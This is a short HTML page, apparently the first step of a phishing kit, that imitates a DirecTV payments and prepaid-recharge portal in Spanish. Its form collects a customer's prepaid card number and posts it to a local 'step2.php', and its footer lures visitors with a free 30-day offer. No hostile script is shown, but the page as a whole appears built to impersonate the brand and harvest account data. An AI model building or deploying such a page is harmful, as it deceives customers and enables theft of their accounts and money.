<!DOCTYPE html>
<html>
<head>
	<title>DirectvGo</title>
	<meta charset="utf-8">
	<meta charset="keywords" content="directv">
	<link rel="stylesheet" type="text/css" href="DirectvGo/estilos/estilo.css">
	<meta name="viewport" content="width=500, initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap" rel="stylesheet">
</head>
<body style="background:linear-gradient(to bottom , #010C1C , #000C0C);">
	<div class="fixed"> <p>Ventas <b>0810-222-3366</b> | Soy cliente</p> </div>
	<nav class="nav-flex">
		<div class="contenedor-img">
			<img src="img/dtv.svg">
		</div>
	</nav>
	<div class="content-flex">
		<div class="texte">
			<h2>Portal de Pagos y Recargas</h2>
		<div class="subtitulo"><p>En este portal podés pagar tu factura o recargar tu Prepago de forma segura, rápida y fácil.</p></div>
		</div>
		
	</div>
	<div class="home">
		<form method="POST" action="step2.php" class="form-flex">
			<p>Completa los datos para ingresar</p>
			<div class="contenedor-inputs">
				<div class="input-box">
					<input type="number" name="numerotarjeta" required="" placeholder="000222444666">
					<label>Ingresa el numero de tu tarjeta prepaga</label>
				</div>
				<div class="contenedor-submit">
					<input type="submit" name="" value="Continuar">
				</div>
			</div>
			
		</form>
		<div class="imgs">
			<div class="imagen">
				<img src="img/prepago.jpg">
			</div>

		</div>
	</div>
	
</body>
<footer><h5>Cambiate a DirectvGo y disfrutalo GRATIS por 30 dias</h5><div class="img"><a href="DirectvGo/DirectvGo.php"><img src="img/directvgo-logo.png"></a></div></footer>
</html>
